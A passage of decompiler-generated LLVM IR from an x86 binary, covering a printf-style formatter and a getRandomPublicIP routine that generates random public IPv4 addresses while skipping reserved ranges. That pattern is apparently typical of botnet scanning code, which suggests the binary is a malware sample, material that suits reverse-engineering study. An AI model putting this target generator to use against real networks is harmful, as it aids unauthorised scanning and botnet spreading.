  store i32 %tmp3, i32* %v6_804ecdc, align 4
  %v5_804ecdf = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_804ecdf = call i32 @prints(i32 %v4_804ecd2, i8* %v5_804ecdf, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.160)
  store i32 %v6_804ecdf, i32* %eax.global-to-local, align 4
  %v0_804ece4 = load i32, i32* @esp, align 4
  %v1_804ece4 = add i32 %v0_804ece4, 16
  %v5_804ece7 = add i32 %v6_804ecdf, %stack_var_-28.160
  br label %dec_label_pc_804ee23

dec_label_pc_804ecef:                             ; preds = %dec_label_pc_804eca4
  store i32 %v4_804ec92.lcssa, i32* %eax.global-to-local, align 4
  %v2_804ecf2 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804ecf2 = zext i8 %v2_804ecf2 to i32
  %v6_804ecf2 = or i32 %v3_804ecf2, %v5_804ec95.lcssa
  store i32 %v6_804ecf2, i32* %eax.global-to-local, align 4
  %v10_804ecf4 = icmp eq i8 %v2_804ecf2, 100
  %v1_804ecf6 = icmp eq i1 %v10_804ecf4, false
  br i1 %v1_804ecf6, label %dec_label_pc_804ed28, label %dec_label_pc_804ecf8

dec_label_pc_804ecf8:                             ; preds = %dec_label_pc_804ecef
  store i32 %stack_var_12.158, i32* @edx, align 4
  %v1_804ecfb = add i32 %stack_var_12.158, 4
  store i32 %stack_var_12.158, i32* %eax.global-to-local, align 4
  %v1_804ed03 = inttoptr i32 %stack_var_12.158 to i32*
  %v2_804ed03 = load i32, i32* %v1_804ed03, align 4
  store i32 %v2_804ed03, i32* %eax.global-to-local, align 4
  %v1_804ed08 = add i32 %v0_804ee11, -8
  %v2_804ed08 = inttoptr i32 %v1_804ed08 to i32*
  store i32 97, i32* %v2_804ed08, align 4
  %v5_804ed0a = add i32 %v0_804ee11, -12
  %v6_804ed0a = inttoptr i32 %v5_804ed0a to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804ed0a, align 4
  %v5_804ed0d = add i32 %v0_804ee11, -16
  %v6_804ed0d = inttoptr i32 %v5_804ed0d to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804ed0d, align 4
  %v1_804ed10 = add i32 %v0_804ee11, -20
  %v2_804ed10 = inttoptr i32 %v1_804ed10 to i32*
  store i32 1, i32* %v2_804ed10, align 4
  %v1_804ed12 = add i32 %v0_804ee11, -24
  %v2_804ed12 = inttoptr i32 %v1_804ed12 to i32*
  store i32 10, i32* %v2_804ed12, align 4
  %v0_804ed14 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ed14 = add i32 %v0_804ee11, -28
  %v3_804ed14 = inttoptr i32 %v2_804ed14 to i32*
  store i32 %v0_804ed14, i32* %v3_804ed14, align 4
  %v5_804ed15 = add i32 %v0_804ee11, -32
  %v6_804ed15 = inttoptr i32 %v5_804ed15 to i32*
  store i32 %tmp3, i32* %v6_804ed15, align 4
  %v1_804ed18 = call i32 @printi(i32 %v1_804ecfb)
  store i32 %v1_804ed18, i32* %eax.global-to-local, align 4
  %v0_804ed1d = load i32, i32* @esp, align 4
  %v1_804ed1d = add i32 %v0_804ed1d, 32
  %v5_804ed20 = add i32 %v1_804ed18, %stack_var_-28.160
  br label %dec_label_pc_804ee23

dec_label_pc_804ed28:                             ; preds = %dec_label_pc_804ecef
  store i32 %v4_804ec92.lcssa, i32* %eax.global-to-local, align 4
  %v2_804ed2b = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804ed2b = zext i8 %v2_804ed2b to i32
  %v6_804ed2b = or i32 %v3_804ed2b, %v5_804ec95.lcssa
  store i32 %v6_804ed2b, i32* %eax.global-to-local, align 4
  %v10_804ed2d = icmp eq i8 %v2_804ed2b, 120
  %v1_804ed2f = icmp eq i1 %v10_804ed2d, false
  br i1 %v1_804ed2f, label %dec_label_pc_804ed61, label %dec_label_pc_804ed31

dec_label_pc_804ed31:                             ; preds = %dec_label_pc_804ed28
  store i32 %stack_var_12.158, i32* @edx, align 4
  %v1_804ed34 = add i32 %stack_var_12.158, 4
  store i32 %stack_var_12.158, i32* %eax.global-to-local, align 4
  %v1_804ed3c = inttoptr i32 %stack_var_12.158 to i32*
  %v2_804ed3c = load i32, i32* %v1_804ed3c, align 4
  store i32 %v2_804ed3c, i32* %eax.global-to-local, align 4
  %v1_804ed41 = add i32 %v0_804ee11, -8
  %v2_804ed41 = inttoptr i32 %v1_804ed41 to i32*
  store i32 97, i32* %v2_804ed41, align 4
  %v5_804ed43 = add i32 %v0_804ee11, -12
  %v6_804ed43 = inttoptr i32 %v5_804ed43 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804ed43, align 4
  %v5_804ed46 = add i32 %v0_804ee11, -16
  %v6_804ed46 = inttoptr i32 %v5_804ed46 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804ed46, align 4
  %v1_804ed49 = add i32 %v0_804ee11, -20
  %v2_804ed49 = inttoptr i32 %v1_804ed49 to i32*
  store i32 0, i32* %v2_804ed49, align 4
  %v1_804ed4b = add i32 %v0_804ee11, -24
  %v2_804ed4b = inttoptr i32 %v1_804ed4b to i32*
  store i32 16, i32* %v2_804ed4b, align 4
  %v0_804ed4d = load i32, i32* %eax.global-to-local, align 4
  %v2_804ed4d = add i32 %v0_804ee11, -28
  %v3_804ed4d = inttoptr i32 %v2_804ed4d to i32*
  store i32 %v0_804ed4d, i32* %v3_804ed4d, align 4
  %v5_804ed4e = add i32 %v0_804ee11, -32
  %v6_804ed4e = inttoptr i32 %v5_804ed4e to i32*
  store i32 %tmp3, i32* %v6_804ed4e, align 4
  %v1_804ed51 = call i32 @printi(i32 %v1_804ed34)
  store i32 %v1_804ed51, i32* %eax.global-to-local, align 4
  %v0_804ed56 = load i32, i32* @esp, align 4
  %v1_804ed56 = add i32 %v0_804ed56, 32
  %v5_804ed59 = add i32 %v1_804ed51, %stack_var_-28.160
  br label %dec_label_pc_804ee23

dec_label_pc_804ed61:                             ; preds = %dec_label_pc_804ed28
  store i32 %v4_804ec92.lcssa, i32* %eax.global-to-local, align 4
  %v2_804ed64 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804ed64 = zext i8 %v2_804ed64 to i32
  %v6_804ed64 = or i32 %v3_804ed64, %v5_804ec95.lcssa
  store i32 %v6_804ed64, i32* %eax.global-to-local, align 4
  %v10_804ed66 = icmp eq i8 %v2_804ed64, 88
  %v1_804ed68 = icmp eq i1 %v10_804ed66, false
  br i1 %v1_804ed68, label %dec_label_pc_804ed9a, label %dec_label_pc_804ed6a

dec_label_pc_804ed6a:                             ; preds = %dec_label_pc_804ed61
  store i32 %stack_var_12.158, i32* @edx, align 4
  %v1_804ed6d = add i32 %stack_var_12.158, 4
  store i32 %stack_var_12.158, i32* %eax.global-to-local, align 4
  %v1_804ed75 = inttoptr i32 %stack_var_12.158 to i32*
  %v2_804ed75 = load i32, i32* %v1_804ed75, align 4
  store i32 %v2_804ed75, i32* %eax.global-to-local, align 4
  %v1_804ed7a = add i32 %v0_804ee11, -8
  %v2_804ed7a = inttoptr i32 %v1_804ed7a to i32*
  store i32 65, i32* %v2_804ed7a, align 4
  %v5_804ed7c = add i32 %v0_804ee11, -12
  %v6_804ed7c = inttoptr i32 %v5_804ed7c to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804ed7c, align 4
  %v5_804ed7f = add i32 %v0_804ee11, -16
  %v6_804ed7f = inttoptr i32 %v5_804ed7f to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804ed7f, align 4
  %v1_804ed82 = add i32 %v0_804ee11, -20
  %v2_804ed82 = inttoptr i32 %v1_804ed82 to i32*
  store i32 0, i32* %v2_804ed82, align 4
  %v1_804ed84 = add i32 %v0_804ee11, -24
  %v2_804ed84 = inttoptr i32 %v1_804ed84 to i32*
  store i32 16, i32* %v2_804ed84, align 4
  %v0_804ed86 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ed86 = add i32 %v0_804ee11, -28
  %v3_804ed86 = inttoptr i32 %v2_804ed86 to i32*
  store i32 %v0_804ed86, i32* %v3_804ed86, align 4
  %v5_804ed87 = add i32 %v0_804ee11, -32
  %v6_804ed87 = inttoptr i32 %v5_804ed87 to i32*
  store i32 %tmp3, i32* %v6_804ed87, align 4
  %v1_804ed8a = call i32 @printi(i32 %v1_804ed6d)
  store i32 %v1_804ed8a, i32* %eax.global-to-local, align 4
  %v0_804ed8f = load i32, i32* @esp, align 4
  %v1_804ed8f = add i32 %v0_804ed8f, 32
  %v5_804ed92 = add i32 %v1_804ed8a, %stack_var_-28.160
  br label %dec_label_pc_804ee23

dec_label_pc_804ed9a:                             ; preds = %dec_label_pc_804ed61
  store i32 %v4_804ec92.lcssa, i32* %eax.global-to-local, align 4
  %v2_804ed9d = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804ed9d = zext i8 %v2_804ed9d to i32
  %v6_804ed9d = or i32 %v3_804ed9d, %v5_804ec95.lcssa
  store i32 %v6_804ed9d, i32* %eax.global-to-local, align 4
  %v10_804ed9f = icmp eq i8 %v2_804ed9d, 117
  %v1_804eda1 = icmp eq i1 %v10_804ed9f, false
  br i1 %v1_804eda1, label %dec_label_pc_804edd0, label %dec_label_pc_804eda3

dec_label_pc_804eda3:                             ; preds = %dec_label_pc_804ed9a
  store i32 %stack_var_12.158, i32* @edx, align 4
  %v1_804eda6 = add i32 %stack_var_12.158, 4
  store i32 %stack_var_12.158, i32* %eax.global-to-local, align 4
  %v1_804edae = inttoptr i32 %stack_var_12.158 to i32*
  %v2_804edae = load i32, i32* %v1_804edae, align 4
  store i32 %v2_804edae, i32* %eax.global-to-local, align 4
  %v1_804edb3 = add i32 %v0_804ee11, -8
  %v2_804edb3 = inttoptr i32 %v1_804edb3 to i32*
  store i32 97, i32* %v2_804edb3, align 4
  %v5_804edb5 = add i32 %v0_804ee11, -12
  %v6_804edb5 = inttoptr i32 %v5_804edb5 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804edb5, align 4
  %v5_804edb8 = add i32 %v0_804ee11, -16
  %v6_804edb8 = inttoptr i32 %v5_804edb8 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804edb8, align 4
  %v1_804edbb = add i32 %v0_804ee11, -20
  %v2_804edbb = inttoptr i32 %v1_804edbb to i32*
  store i32 0, i32* %v2_804edbb, align 4
  %v1_804edbd = add i32 %v0_804ee11, -24
  %v2_804edbd = inttoptr i32 %v1_804edbd to i32*
  store i32 10, i32* %v2_804edbd, align 4
  %v0_804edbf = load i32, i32* %eax.global-to-local, align 4
  %v2_804edbf = add i32 %v0_804ee11, -28
  %v3_804edbf = inttoptr i32 %v2_804edbf to i32*
  store i32 %v0_804edbf, i32* %v3_804edbf, align 4
  %v5_804edc0 = add i32 %v0_804ee11, -32
  %v6_804edc0 = inttoptr i32 %v5_804edc0 to i32*
  store i32 %tmp3, i32* %v6_804edc0, align 4
  %v1_804edc3 = call i32 @printi(i32 %v1_804eda6)
  store i32 %v1_804edc3, i32* %eax.global-to-local, align 4
  %v0_804edc8 = load i32, i32* @esp, align 4
  %v1_804edc8 = add i32 %v0_804edc8, 32
  %v5_804edcb = add i32 %v1_804edc3, %stack_var_-28.160
  br label %dec_label_pc_804ee23

dec_label_pc_804edd0:                             ; preds = %dec_label_pc_804ed9a
  store i32 %v4_804ec92.lcssa, i32* %eax.global-to-local, align 4
  %v2_804edd3 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804edd3 = zext i8 %v2_804edd3 to i32
  %v6_804edd3 = or i32 %v3_804edd3, %v5_804ec95.lcssa
  store i32 %v6_804edd3, i32* %eax.global-to-local, align 4
  %v10_804edd5 = icmp eq i8 %v2_804edd3, 99
  %v1_804edd7 = icmp eq i1 %v10_804edd5, false
  br i1 %v1_804edd7, label %dec_label_pc_804ee23, label %dec_label_pc_804edd9

dec_label_pc_804edd9:                             ; preds = %dec_label_pc_804edd0
  store i32 %stack_var_12.158, i32* @edx, align 4
  %v1_804eddc = add i32 %stack_var_12.158, 4
  store i32 %stack_var_12.158, i32* %eax.global-to-local, align 4
  %v1_804ede4 = inttoptr i32 %stack_var_12.158 to i32*
  %v2_804ede4 = load i32, i32* %v1_804ede4, align 4
  store i32 %v2_804ede4, i32* %stack_var_-6, align 4
  %v5_804eded = add i32 %v0_804ee11, -4
  %v6_804eded = inttoptr i32 %v5_804eded to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804eded, align 4
  %v5_804edf0 = add i32 %v0_804ee11, -8
  %v6_804edf0 = inttoptr i32 %v5_804edf0 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804edf0, align 4
  store i32 %v2_804edf3, i32* %eax.global-to-local, align 4
  %v2_804edf6 = add i32 %v0_804ee11, -12
  %v3_804edf6 = inttoptr i32 %v2_804edf6 to i32*
  store i32 %v2_804edf3, i32* %v3_804edf6, align 4
  %v5_804edf7 = add i32 %v0_804ee11, -16
  %v6_804edf7 = inttoptr i32 %v5_804edf7 to i32*
  store i32 %tmp3, i32* %v6_804edf7, align 4
  %v0_804edfa = load i32, i32* %stack_var_-6, align 4
  %v6_804edfa = call i32 @prints(i32 %v0_804edfa, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804edfa, i32* %eax.global-to-local, align 4
  %v0_804edff = load i32, i32* @esp, align 4
  %v1_804edff = add i32 %v0_804edff, 16
  %v5_804ee02 = add i32 %v6_804edfa, %stack_var_-28.160
  br label %dec_label_pc_804ee23

dec_label_pc_804ee07:                             ; preds = %dec_label_pc_804ec3a, %dec_label_pc_804ec10
  %stack_var_8.2 = phi i8* [ %stack_var_8.461, %dec_label_pc_804ec10 ], [ %v22_804ec1d, %dec_label_pc_804ec3a ]
  %v4_804ee07 = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_804ee07, i32* %eax.global-to-local, align 4
  %v2_804ee0a = load i8, i8* %stack_var_8.2, align 1
  %v3_804ee0a = zext i8 %v2_804ee0a to i32
  store i32 %v3_804ee0a, i32* %eax.global-to-local, align 4
  %v2_804ee14 = add i32 %v0_804ee11, -12
  %v3_804ee14 = inttoptr i32 %v2_804ee14 to i32*
  store i32 %v3_804ee0a, i32* %v3_804ee14, align 4
  %v5_804ee15 = add i32 %v0_804ee11, -16
  %v6_804ee15 = inttoptr i32 %v5_804ee15 to i32*
  store i32 %tmp3, i32* %v6_804ee15, align 4
  %v2_804ee18 = inttoptr i32 %stack_var_-28.160 to i32*
  %v3_804ee18 = call i32 @printchar(i32* %v2_804ee18, i32 %stack_var_-24.157)
  store i32 %v3_804ee18, i32* %eax.global-to-local, align 4
  %v0_804ee1d = load i32, i32* @esp, align 4
  %v1_804ee1d = add i32 %v0_804ee1d, 16
  %v4_804ee20 = add i32 %stack_var_-28.160, 1
  br label %dec_label_pc_804ee23

dec_label_pc_804ee23:                             ; preds = %dec_label_pc_804edd0, %dec_label_pc_804edd9, %dec_label_pc_804eda3, %dec_label_pc_804ed6a, %dec_label_pc_804ed31, %dec_label_pc_804ecf8, %dec_label_pc_804ecd2, %dec_label_pc_804ee07
  %v4_804ecd572 = phi i32 [ %v1_804ee1d, %dec_label_pc_804ee07 ], [ %v0_804ee11, %dec_label_pc_804edd0 ], [ %v1_804edff, %dec_label_pc_804edd9 ], [ %v1_804edc8, %dec_label_pc_804eda3 ], [ %v1_804ed8f, %dec_label_pc_804ed6a ], [ %v1_804ed56, %dec_label_pc_804ed31 ], [ %v1_804ed1d, %dec_label_pc_804ecf8 ], [ %v1_804ece4, %dec_label_pc_804ecd2 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.157, %dec_label_pc_804ee07 ], [ %stack_var_-24.157, %dec_label_pc_804edd0 ], [ %stack_var_-24.157, %dec_label_pc_804edd9 ], [ %stack_var_-24.157, %dec_label_pc_804eda3 ], [ %stack_var_-24.157, %dec_label_pc_804ed6a ], [ %stack_var_-24.157, %dec_label_pc_804ed31 ], [ %stack_var_-24.157, %dec_label_pc_804ecf8 ], [ %v2_804ecb8, %dec_label_pc_804ecd2 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.158, %dec_label_pc_804ee07 ], [ %stack_var_12.158, %dec_label_pc_804edd0 ], [ %v1_804eddc, %dec_label_pc_804edd9 ], [ %v1_804eda6, %dec_label_pc_804eda3 ], [ %v1_804ed6d, %dec_label_pc_804ed6a ], [ %v1_804ed34, %dec_label_pc_804ed31 ], [ %v1_804ecfb, %dec_label_pc_804ecf8 ], [ %v1_804ecb0, %dec_label_pc_804ecd2 ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_804ee07 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804edd0 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804edd9 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804eda3 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804ed6a ], [ %stack_var_8.1.lcssa, %dec_label_pc_804ed31 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804ecf8 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804ecd2 ]
  %stack_var_-28.0 = phi i32 [ %v4_804ee20, %dec_label_pc_804ee07 ], [ %stack_var_-28.160, %dec_label_pc_804edd0 ], [ %v5_804ee02, %dec_label_pc_804edd9 ], [ %v5_804edcb, %dec_label_pc_804eda3 ], [ %v5_804ed92, %dec_label_pc_804ed6a ], [ %v5_804ed59, %dec_label_pc_804ed31 ], [ %v5_804ed20, %dec_label_pc_804ecf8 ], [ %v5_804ece7, %dec_label_pc_804ecd2 ]
  %v4_804ee23 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_804ee23 = add i32 %v4_804ee23, 1
  %stack_var_8.4 = inttoptr i32 %v5_804ee23 to i8*
  store i32 %v5_804ee23, i32* %eax.global-to-local, align 4
  %v2_804ee29 = load i8, i8* %stack_var_8.4, align 1
  %v3_804ee29 = zext i8 %v2_804ee29 to i32
  %v5_804ee29 = and i32 %v5_804ee23, -256
  %v6_804ee29 = or i32 %v3_804ee29, %v5_804ee29
  store i32 %v6_804ee29, i32* %eax.global-to-local, align 4
  %v4_804ee2b = icmp eq i8 %v2_804ee29, 0
  %v1_804ee2d = icmp eq i1 %v4_804ee2b, false
  br i1 %v1_804ee2d, label %dec_label_pc_804ec10, label %dec_label_pc_804ee33

dec_label_pc_804ee33:                             ; preds = %dec_label_pc_804ee23, %dec_label_pc_804ec1d, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.160, %dec_label_pc_804ec1d ], [ %stack_var_-28.0, %dec_label_pc_804ee23 ]
  %v4_804ee33 = icmp eq i32* %arg1, null
  br i1 %v4_804ee33, label %dec_label_pc_804ee41, label %dec_label_pc_804ee39

dec_label_pc_804ee39:                             ; preds = %dec_label_pc_804ee33
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v2_804ee3c = load i32, i32* %arg1, align 4
  store i32 %v2_804ee3c, i32* %eax.global-to-local, align 4
  %v1_804ee3e = inttoptr i32 %v2_804ee3c to i8*
  store i8 0, i8* %v1_804ee3e, align 1
  br label %dec_label_pc_804ee41

dec_label_pc_804ee41:                             ; preds = %dec_label_pc_804ee33, %dec_label_pc_804ee39
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  %v2_804ee44 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ee44, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i32 %v5_804ee29, { 1, 0 }
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_804ee23, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_804ecb8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_804ec95.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_804ec92.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_804ec5c, { 1, 2, 3, 0 }
  uselistorder i8* %v22_804ec1d, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.157, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.158, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %stack_var_8.4.in59, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.160, { 0, 3, 2, 1, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %v0_804ee11, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 3, 4, 5, 61, 62, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 47, 48, 49, 50, 46, 0, 63, 51, 52, 65, 1, 53, 54, 55, 56, 57, 58, 59, 60, 64, 2 }
  uselistorder i32 (i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_804ee41, { 1, 0 }
  uselistorder label %dec_label_pc_804ee23, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804ecd2, { 1, 0 }
  uselistorder label %dec_label_pc_804eca4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ec9b, { 1, 0 }
  uselistorder label %dec_label_pc_804ec5c, { 1, 0 }
  uselistorder label %dec_label_pc_804ec10, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_804ee4f = ptrtoint i32* %stack_var_12 to i32
  %v4_804ee60 = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_804ee4f)
  ret i32 %v4_804ee60
}

define i32 @getRandomPublicIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ee6d = load i32, i32* @edi, align 4
  %v0_804ee6e = load i32, i32* @esi, align 4
  %v0_804ee6f = load i32, i32* @ebx, align 4
  store i32 %v0_804ee6f, i32* %stack_var_-16, align 4
  %v1_804ee73 = call i32 @random()
  store i32 223, i32* @ecx, align 4
  %v2_804ee83 = ashr i32 %v1_804ee73, 31
  %v2_804ee86 = zext i32 %v1_804ee73 to i64
  %v4_804ee86 = zext i32 %v2_804ee83 to i64
  %v5_804ee86 = mul nuw i64 %v4_804ee86, 4294967296
  %v6_804ee86 = or i64 %v5_804ee86, %v2_804ee86
  %v10_804ee86 = srem i64 %v6_804ee86, 223
  %v1_804ee8a = trunc i64 %v10_804ee86 to i8
  store i8 %v1_804ee8a, i8* @global_var_8074484.249, align 4
  %v0_804ee8f = call i32 @random()
  store i32 255, i32* @ecx, align 4
  %v2_804ee9f = ashr i32 %v0_804ee8f, 31
  %v2_804eea2 = zext i32 %v0_804ee8f to i64
  %v4_804eea2 = zext i32 %v2_804ee9f to i64
  %v5_804eea2 = mul nuw i64 %v4_804eea2, 4294967296
  %v6_804eea2 = or i64 %v5_804eea2, %v2_804eea2
  %v10_804eea2 = srem i64 %v6_804eea2, 255
  %v1_804eea6 = trunc i64 %v10_804eea2 to i8
  store i8 %v1_804eea6, i8* @global_var_8074485.250, align 1
  %v0_804eeab = call i32 @random()
  store i32 255, i32* @ecx, align 4
  %v2_804eebb = ashr i32 %v0_804eeab, 31
  %v2_804eebe = zext i32 %v0_804eeab to i64
  %v4_804eebe = zext i32 %v2_804eebb to i64
  %v5_804eebe = mul nuw i64 %v4_804eebe, 4294967296
  %v6_804eebe = or i64 %v5_804eebe, %v2_804eebe
  %v10_804eebe = srem i64 %v6_804eebe, 255
  %v1_804eec2 = trunc i64 %v10_804eebe to i8
  store i8 %v1_804eec2, i8* @global_var_8074486.251, align 2
  %v0_804eec7 = call i32 @random()
  store i32 255, i32* @ecx, align 4
  %v2_804eed7 = ashr i32 %v0_804eec7, 31
  %v2_804eeda = zext i32 %v0_804eec7 to i64
  %v4_804eeda = zext i32 %v2_804eed7 to i64
  %v5_804eeda = mul nuw i64 %v4_804eeda, 4294967296
  %v6_804eeda = or i64 %v5_804eeda, %v2_804eeda
  br label %dec_label_pc_804ef55

dec_label_pc_804eee5:                             ; preds = %dec_label_pc_804efbf, %dec_label_pc_804f081, %dec_label_pc_804f074, %dec_label_pc_804f055, %dec_label_pc_804f036, %dec_label_pc_804f029, %dec_label_pc_804f013, %dec_label_pc_804effd, %dec_label_pc_804efde, %dec_label_pc_804efa0, %dec_label_pc_804ef8a, %dec_label_pc_804ef7d, %dec_label_pc_804ef5e, %dec_label_pc_804ef55
  %v0_804eee5 = call i32 @random()
  store i32 223, i32* @ecx, align 4
  %v2_804eef5 = ashr i32 %v0_804eee5, 31
  %v2_804eef8 = zext i32 %v0_804eee5 to i64
  %v4_804eef8 = zext i32 %v2_804eef5 to i64
  %v5_804eef8 = mul nuw i64 %v4_804eef8, 4294967296
  %v6_804eef8 = or i64 %v5_804eef8, %v2_804eef8
  %v10_804eef8 = srem i64 %v6_804eef8, 223
  %v1_804eefc = trunc i64 %v10_804eef8 to i8
  store i8 %v1_804eefc, i8* @global_var_8074484.249, align 4
  %v0_804ef01 = call i32 @random()
  store i32 255, i32* @ecx, align 4
  %v2_804ef11 = ashr i32 %v0_804ef01, 31
  %v2_804ef14 = zext i32 %v0_804ef01 to i64
  %v4_804ef14 = zext i32 %v2_804ef11 to i64
  %v5_804ef14 = mul nuw i64 %v4_804ef14, 4294967296
  %v6_804ef14 = or i64 %v5_804ef14, %v2_804ef14
  %v10_804ef14 = srem i64 %v6_804ef14, 255
  %v1_804ef18 = trunc i64 %v10_804ef14 to i8
  store i8 %v1_804ef18, i8* @global_var_8074485.250, align 1
  %v0_804ef1d = call i32 @random()
  store i32 255, i32* @ecx, align 4
  %v2_804ef2d = ashr i32 %v0_804ef1d, 31
  %v2_804ef30 = zext i32 %v0_804ef1d to i64
  %v4_804ef30 = zext i32 %v2_804ef2d to i64
  %v5_804ef30 = mul nuw i64 %v4_804ef30, 4294967296
  %v6_804ef30 = or i64 %v5_804ef30, %v2_804ef30
  %v10_804ef30 = srem i64 %v6_804ef30, 255
  %v1_804ef34 = trunc i64 %v10_804ef30 to i8
  store i8 %v1_804ef34, i8* @global_var_8074486.251, align 2
  %v0_804ef39 = call i32 @random()
  store i32 255, i32* @ecx, align 4
  %v2_804ef49 = ashr i32 %v0_804ef39, 31
  %v2_804ef4c = zext i32 %v0_804ef39 to i64
  %v4_804ef4c = zext i32 %v2_804ef49 to i64
  %v5_804ef4c = mul nuw i64 %v4_804ef4c, 4294967296
  %v6_804ef4c = or i64 %v5_804ef4c, %v2_804ef4c
  br label %dec_label_pc_804ef55

dec_label_pc_804ef55:                             ; preds = %entry, %dec_label_pc_804eee5
  %v6_804eeda.sink = phi i64 [ %v6_804eeda, %entry ], [ %v6_804ef4c, %dec_label_pc_804eee5 ]
  %v10_804eeda = srem i64 %v6_804eeda.sink, 255
  %extract.t = trunc i64 %v10_804eeda to i8
  %extract.t8 = trunc i64 %v10_804eeda to i32
  store i8 %extract.t, i8* @global_var_8074487.252, align 1
  %v0_804ef55 = load i8, i8* @global_var_8074484.249, align 4
  %v1_804ef55 = zext i8 %v0_804ef55 to i32
  %v4_804ef5a = icmp eq i8 %v0_804ef55, 0
  br i1 %v4_804ef5a, label %dec_label_pc_804eee5, label %dec_label_pc_804ef5e

dec_label_pc_804ef5e:                             ; preds = %dec_label_pc_804ef55
  %v10_804ef63 = icmp eq i8 %v0_804ef55, 10
  br i1 %v10_804ef63, label %dec_label_pc_804eee5, label %dec_label_pc_804ef6b

dec_label_pc_804ef6b:                             ; preds = %dec_label_pc_804ef5e
  %v10_804ef70 = icmp eq i8 %v0_804ef55, 100
  %v1_804ef72 = icmp eq i1 %v10_804ef70, false
  br i1 %v1_804ef72, label %dec_label_pc_804ef8a, label %dec_label_pc_804ef74

dec_label_pc_804ef74:                             ; preds = %dec_label_pc_804ef6b
  %v0_804ef74 = load i8, i8* @global_var_8074485.250, align 1
  %tmp44 = icmp ult i8 %v0_804ef74, 64
  br i1 %tmp44, label %dec_label_pc_804ef8a, label %dec_label_pc_804ef7d

dec_label_pc_804ef7d:                             ; preds = %dec_label_pc_804ef74
  %v5_804ef82 = icmp slt i8 %v0_804ef74, 0
  %v1_804ef84 = icmp eq i1 %v5_804ef82, false
  br i1 %v1_804ef84, label %dec_label_pc_804eee5, label %dec_label_pc_804ef8a

